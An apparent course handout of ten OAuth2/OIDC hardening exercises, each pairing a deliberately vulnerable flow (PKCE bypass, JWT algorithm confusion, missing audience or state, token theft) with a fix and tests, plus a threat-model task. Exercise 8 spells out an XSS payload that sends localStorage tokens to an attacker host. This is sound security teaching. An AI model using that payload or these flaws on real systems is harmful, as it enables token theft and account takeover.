# OAuth2 & OIDC — Hands-On Exercises

**Hardening & Debugging Tasks** — Each exercise includes a vulnerable/broken implementation to fix, a debugging challenge, or a threat-modeling scenario.

---

## Exercise 1: PKCE Bypass — Missing Code Verifier Validation

**File**: `src/main/java/com/security/deep/lab02/PkceBypass.java`

**Scenario**: An authorization server implements PKCE but has a bug: it accepts token exchange requests with empty or missing `code_verifier` when the original auth request had a `code_challenge`.

**Task**:
1. Run the vulnerable server; capture a valid authorization code (with PKCE challenge)
2. Exchange the code *without* providing `code_verifier` — observe it succeeds
3. Fix: enforce `code_verifier` presence and validate `SHA256(verifier) == challenge`
4. Add test: verify rejection when verifier missing, wrong, or challenge method unsupported

**Threat Model**: Attacker intercepts authorization code (via custom scheme, XSS, logs). Without verifier check, code alone grants tokens.

**Verification**: Exchange without verifier returns `invalid_grant`. Exchange with wrong verifier returns `invalid_grant`.

---

## Exercise 2: JWT Algorithm Confusion — RS256 vs HS256

**File**: `src/main/java/com/security/deep/lab02/AlgorithmConfusion.java`

**Scenario**: A resource server validates JWTs but reads the `alg` header from the token to decide verification method. It has an RSA public key configured.

**Task**:
1. Create a valid RS256 token (signed with private key)
2. Flip header to `"alg":"HS256"` and sign with the *public key* as HMAC secret
3. Observe the vulnerable server accepts it
4. Fix: configure expected algorithm per key; reject tokens with mismatched `alg`
5. Test: RS256 token with HS256 header rejected; HS256 token with RS256 header rejected

**Threat Model**: Attacker has public key (it's public). Crafts token with `alg:HS256`, signs with public key as HMAC secret. Server confusion → valid signature.

**Verification**: All algorithm confusion variants rejected with clear error.

---

## Exercise 3: Missing Audience Validation — Confused Deputy

**File**: `src/main/java/com/security/deep/lab02/MissingAudience.java`

**Scenario**: Two APIs (Calendar API, Email API) share the same auth server. Calendar API validates tokens but doesn't check `aud`. Attacker gets token for `aud:calendar`, sends to Email API.

**Task**:
1. Obtain valid token with `aud:calendar` from auth server
2. Call Email API with this token — observe it's accepted (vulnerable)
3. Fix Email API: validate `aud` claim equals `"email-api"`
4. Test: token with `aud:calendar` rejected; token with `aud:email-api` accepted

**Threat Model**: Attacker legitimately obtains token for one service, reuses it for another. Without `aud` check, services confuse each other's tokens.

**Verification**: Cross-service token rejected; same-service token accepted.

---

## Exercise 4: Refresh Token Without Rotation — Persistent Theft

**File**: `src/main/java/com/security/deep/lab02/RefreshTokenTheft.java`

**Scenario**: Auth server issues long-lived refresh tokens (30 days) without rotation. Attacker steals refresh token from client logs.

**Task**:
1. Simulate legitimate client using refresh token every hour
2. Simulate attacker using stolen refresh token — both work indefinitely
3. Implement rotation: each use invalidates old token, issues new one
4. Add theft detection: if same refresh token used twice (legitimate + attacker), revoke all user sessions, alert
5. Test: attacker's stolen token works once, then fails; legitimate client gets new token; simultaneous use triggers revocation

**Threat Model**: Attacker steals refresh token (XSS, log leak, backup). Without rotation, indefinite access. With rotation + detection, theft detected on next legitimate use.

**Verification**: Rotation enforced; theft detected within one legitimate use cycle.

---

## Exercise 5: Implicit Flow Token Leakage in Browser History

**File**: `src/main/java/com/security/deep/lab02/ImplicitFlowLeak.java`

**Scenario**: Legacy SPA uses OAuth2 Implicit Flow. Access token returned in URL fragment: `https://app.com/callback#access_token=xxx&expires_in=3600`.

**Task**:
1. Simulate browser navigation: user logs in, token in fragment
2. Show token leaked via: `document.referrer`, browser history API, analytics scripts, server logs (if fragment sent)
3. Refactor to Authorization Code + PKCE: token returned via backend POST, never in browser URL
4. Test: no token in URL, history, or referrer after migration

**Threat Model**: Browser threat model — any script on page, analytics, proxies, browser sync can capture URL fragments. Implicit flow puts token directly in fragment.

**Verification**: Post-migration, token never appears in browser-visible locations.

---

## Exercise 6: OIDC Discovery Endpoint Poisoning

**File**: `src/main/java/com/security/deep/lab02/DiscoveryPoisoning.java`

**Scenario**: Client fetches OIDC discovery config at startup. Attacker performs DNS hijack or compromises auth server, serves malicious config with attacker-controlled `token_endpoint` and `jwks_uri`.

**Task**:
1. Implement client that fetches discovery config and caches `issuer`, `jwks_uri`, `token_endpoint`
2. Simulate poisoned config: different `issuer`, attacker's `jwks_uri`
3. Fix: pin expected `issuer` and `jwks_uri` at deploy time; validate fetched config matches pins
4. Test: poisoned config rejected; valid config with rotated keys accepted

**Threat Model**: Attacker controls network (DNS, BGP) or compromises auth server. Poisoned discovery redirects token requests and key fetching to attacker.

**Verification**: Config with wrong issuer/jwks_uri rejected; legitimate key rotation works.

---

## Exercise 7: State Parameter Missing — CSRF on OAuth Flow

**File**: `src/main/java/com/security/deep/lab02/MissingState.java`

**Scenario**: OAuth2 authorization request lacks `state` parameter. Attacker initiates auth flow on victim's browser, victim completes it, attacker receives code.

**Task**:
1. Demonstrate attack: attacker crafts auth URL without state, tricks victim to visit
2. Victim logs in, authorizes; attacker receives redirect with code
3. Attacker exchanges code for tokens (attacker's redirect_uri)
4. Fix: generate cryptographically random `state`, store in user session, validate on callback
5. Test: callback without state rejected; callback with wrong state rejected; valid state accepted

**Threat Model**: Attacker initiates OAuth flow on victim's browser (phishing link, iframe, redirect). Without state, victim's authorization binds to attacker's session.

**Verification**: CSRF attack blocked; legitimate flow works.

---

## Exercise 8: Token Storage in localStorage — XSS Theft

**File**: `src/main/java/com/security/deep/lab02/LocalStorageTheft.java`

**Scenario**: SPA stores access and refresh tokens in `localStorage`. Page has reflected XSS vulnerability.

**Task**:
1. Create simple SPA with `localStorage.setItem('access_token', token)`
2. Inject XSS payload: `fetch('https://attacker.com/steal?' + localStorage.access_token)`
3. Observe tokens stolen
4. Refactor: access token in memory (React context, Vue store, etc.), refresh token in HTTP-only cookie
5. Test: XSS payload cannot access tokens (HTTP-only cookie inaccessible to JS; memory token not in DOM)

**Threat Model**: XSS is inevitable in complex SPAs (dependencies, human error). localStorage has zero XSS protection.

**Verification**: XSS executes but tokens not exfiltrated.

---

## Exercise 9: JWKS Cache Poisoning / Stale Keys

**File**: `src/main/java/com/security/deep/lab02/JwksCachePoisoning.java`

**Scenario**: Resource server caches JWKS with long TTL. Auth server rotates keys (compromise response). Server still validates with old keys.

**Task**:
1. Implement JWKS fetcher with cache (TTL 1 hour)
2. Simulate key rotation: auth server publishes new keys, old keys revoked
3. Show server accepts tokens signed with revoked key (stale cache)
4. Fix: respect `Cache-Control` header, max TTL 5 min, on verification failure re-fetch JWKS once
5. Test: revoked key rejected after rotation; new key accepted; cache refreshed on failure

**Threat Model**: Key compromise requires immediate revocation. Long cache TTL extends vulnerability window.

**Verification**: Key rotation propagated within 5 minutes; revoked keys rejected.

---

## Exercise 10: Design a Threat Model for an OAuth2/OIDC Deployment

**File**: `docs/threat-model-oauth2.md` (create this)

**Scenario**: You're deploying OAuth2/OIDC for a multi-tenant SaaS with 50+ microservices, SPAs, mobile apps, and third-party integrations.

**Task**:
1. **Assets**: Access tokens, refresh tokens, auth codes, client secrets, user credentials, signing keys, authorization codes
2. **Adversaries**: 
   - Malicious tenant (cross-tenant token use)
   - Compromised SPA (XSS, supply chain)
   - Compromised mobile app (reverse engineering, rooted device)
   - Network attacker (DNS, BGP, TLS termination)
   - Malicious third-party integration (excessive scopes)
   - Insider (auth server admin)
3. **Trust Boundaries**: Auth server ↔ Resource servers, Auth server ↔ Clients, Client ↔ User Agent, Resource server ↔ Resource server
4. **Per-Component Threats & Mitigations**:
   - Auth server: key compromise → HSM, rotation, short expiry
   - Clients: secret leakage → PKCE for public, confidential clients only for backend
   - Tokens: theft → short access, rotation, HTTP-only cookies, secure storage
   - Scopes: over-privilege → least privilege, consent, admin approval
   - Flows: CSRF → state, PKCE; code interception → PKCE; token leakage → no implicit flow
   - Discovery: poisoning → pin issuer/jwks_uri
   - Revocation: stateless JWT → refresh token rotation + blocklist
5. **Monitoring & Detection**: Anomalous token use (geo, IP, client), simultaneous refresh use, failed validations, scope escalation attempts
6. **Incident Response**: Key rotation procedure, token revocation cascade, tenant isolation

**Deliverable**: `THREAT_MODEL.md` with STRIDE analysis per component, data flow diagrams, mitigation checklist, testing requirements (Wycheproof, OAuth2 security test suite).